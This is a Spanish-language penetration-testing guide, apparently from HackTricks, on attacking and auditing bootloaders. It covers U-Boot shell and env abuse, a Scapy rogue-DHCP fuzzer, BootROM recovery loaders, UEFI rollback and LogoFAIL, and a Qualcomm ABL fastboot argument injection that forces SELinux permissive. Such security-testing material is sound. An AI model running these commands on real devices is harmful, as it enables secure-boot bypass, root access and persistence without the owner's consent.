# Pruebas de Bootloader

{{#include ../../banners/hacktricks-training.md}}

Los siguientes pasos se recomiendan para modificar las configuraciones de arranque del dispositivo y probar bootloaders como U-Boot y loaders de tipo UEFI. Enfócate en obtener ejecución de código temprana, evaluar protecciones de firma/rollback y abusar de rutas de recuperación o de arranque por red.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: consejos rápidos y abuso del entorno

1. Acceder al intérprete (shell)
- Durante el arranque, presiona una tecla de ruptura conocida (a menudo cualquier tecla, 0, espacio, o una secuencia "mágica" específica de la placa) antes de que `bootcmd` se ejecute para entrar al prompt de U-Boot.

2. Inspeccionar el estado de arranque y las variables
- Comandos útiles:
- `printenv` (volcar environment)
- `bdinfo` (info de la board, direcciones de memoria)
- `help bootm; help booti; help bootz` (métodos soportados para bootear el kernel)
- `help ext4load; help fatload; help tftpboot` (cargadores disponibles)

3. Modificar argumentos de arranque para obtener un shell root
- Añade `init=/bin/sh` para que el kernel caiga a un shell en lugar del init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Arranque por red desde tu servidor TFTP
- Configura la red y obtén un kernel/fit image desde la LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistir cambios vía environment
- Si el almacenamiento del env no está protegido contra escritura, puedes persistir el control:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Revisa variables como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influyen en rutas de fallback. Valores mal configurados pueden permitir interrupciones repetidas al shell.

6. Comprobar características de depuración/poco seguras
- Busca: `bootdelay` > 0, `autoboot` deshabilitado, `usb start; fatload usb 0:1 ...` sin restricciones, capacidad de `loady`/`loads` vía serial, `env import` desde medios no confiables, y kernels/ramdisks cargados sin comprobaciones de firma.

7. Pruebas de imagen/verificación de U-Boot
- Si la plataforma afirma tener secure/verified boot con imágenes FIT, prueba tanto imágenes sin firmar como manipuladas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- La ausencia de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o el comportamiento legacy `verify=n` a menudo permite bootear payloads arbitrarios.

## Superficie de arranque por red (DHCP/PXE) y servidores maliciosos

8. Fuzzing de parámetros PXE/DHCP
- El manejo legacy BOOTP/DHCP de U-Boot ha tenido problemas de seguridad de memoria. Por ejemplo, CVE‑2024‑42040 describe divulgación de memoria vía respuestas DHCP manipuladas que pueden leak bytes desde la memoria de U-Boot de vuelta en la red. Ejercita las rutas de código DHCP/PXE con valores sobredimensionados o en casos límite (option 67 bootfile-name, vendor options, campos file/servername) y observa cuelgues/leaks.
- Snippet mínimo de Scapy para forzar parámetros de arranque por red:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- También valida si los campos de filename de PXE se pasan a la lógica del shell/loader sin sanitizar cuando se encadenan a scripts de aprovisionamiento en el lado del OS.

9. Pruebas de inyección de comandos con DHCP malicioso
- Monta un servicio DHCP/PXE malicioso e intenta inyectar caracteres en los campos filename u options para alcanzar intérpretes de comando en etapas posteriores de la cadena de arranque. El auxiliar DHCP de Metasploit, `dnsmasq`, o scripts personalizados en Scapy funcionan bien. Asegúrate de aislar primero la red del laboratorio.

## Modos de recuperación BootROM de SoC que sobrescriben el arranque normal

Muchos SoC exponen un modo "BootROM loader" que aceptará código por USB/UART incluso cuando las imágenes en flash sean inválidas. Si los fuses de secure-boot no están quemados, esto puede proporcionar ejecución de código arbitraria muy temprano en la cadena.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Evalúa si el dispositivo tiene eFuses/OTP de secure-boot quemados. Si no, los modos de descarga BootROM con frecuencia bypass cualquier verificación de nivel superior (U-Boot, kernel, rootfs) ejecutando tu payload de primera etapa directamente desde SRAM/DRAM.

## UEFI/bootloaders de clase PC: comprobaciones rápidas

10. Manipulación del ESP y pruebas de rollback
- Monta la EFI System Partition (ESP) y revisa los componentes del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, rutas de logo del vendor.
- Intenta bootear con componentes firmados downgraded o con vulnerabilidades conocidas si las revocaciones de Secure Boot (dbx) no están actualizadas. Si la plataforma aún confía en shims/bootmanagers antiguos, a menudo puedes cargar tu propio kernel o `grub.cfg` desde la ESP para obtener persistencia.

11. Bugs en parsing de logos de arranque (clase LogoFAIL)
- Varias firmware OEM/IBV fueron vulnerables a fallos en el parseo de imágenes en DXE que procesan los logos de arranque. Si un atacante puede colocar una imagen crafteda en la ESP bajo una ruta específica del vendor (por ejemplo, `\EFI\<vendor>\logo\*.bmp`) y reiniciar, podría ser posible ejecución de código durante el arranque temprano incluso con Secure Boot habilitado. Prueba si la plataforma acepta logos suministrados por el usuario y si esas rutas son escribibles desde el OS.

## Android/Qualcomm ABL + GBL (Android 16): gaps de confianza

En dispositivos Android 16 que usan el ABL de Qualcomm para cargar la **Generic Bootloader Library (GBL)**, valida si ABL **authentica** la UEFI app que carga desde la partición `efisp`. Si ABL solo comprueba la **presencia** de una UEFI app y no verifica firmas, una primitiva de escritura a `efisp` se convierte en ejecución de código unsigned pre-OS al arrancar.

Pruebas prácticas y vectores de abuso:

- **efisp write primitive**: Necesitas una forma de escribir una UEFI app personalizada en `efisp` (root/servicio privilegiado, bug en una app OEM, ruta de recovery/fastboot). Sin esto, la brecha de carga GBL no es directamente alcanzable.
- **fastboot OEM argument injection** (ABL bug): Algunas builds aceptan tokens extra en `fastboot oem set-gpu-preemption` y los añaden a la cmdline del kernel. Esto puede usarse para forzar SELinux permisivo, habilitando escrituras a particiones protegidas:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Si el dispositivo está parchado, el comando debe rechazar argumentos adicionales.
- **Desbloqueo del bootloader vía flags persistentes**: Un payload en etapa de boot puede voltear flags persistentes de desbloqueo (por ejemplo, `is_unlocked=1`, `is_unlocked_critical=1`) para emular `fastboot oem unlock` sin pasarela del servidor OEM/aprobación. Este cambio es duradero tras el siguiente reinicio.

Notas defensivas/triage:

- Confirma si ABL realiza verificación de firmas sobre el payload GBL/UEFI desde `efisp`. Si no, trata `efisp` como una superficie de persistencia de alto riesgo.
- Rastrea si los handlers fastboot OEM de ABL están parchados para **validar el número de argumentos** y rechazar tokens adicionales.

## Precauciones de hardware

Ten cuidado al interactuar con SPI/NAND flash durante el arranque temprano (por ejemplo, poniendo a masa pines para bypass de lecturas) y consulta siempre la hoja de datos (datasheet) de la flash. Cortocircuitos temporizados incorrectamente pueden corromper el dispositivo o el programador.

## Notas y consejos adicionales

- Prueba `env export -t ${loadaddr}` y `env import -t ${loadaddr}` para mover blobs de environment entre RAM y almacenamiento; algunas plataformas permiten importar env desde medios removibles sin autenticación.
- Para persistencia en sistemas Linux que arrancan vía `extlinux.conf`, modificar la línea `APPEND` (para inyectar `init=/bin/sh` o `rd.break`) en la partición de arranque suele ser suficiente cuando no hay comprobaciones de firma.
- Si el userland provee `fw_printenv/fw_setenv`, valida que `/etc/fw_env.config` coincida con el almacenamiento real del env. Offsets mal configurados permiten leer/escribir la región MTD equivocada.

## Referencias

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
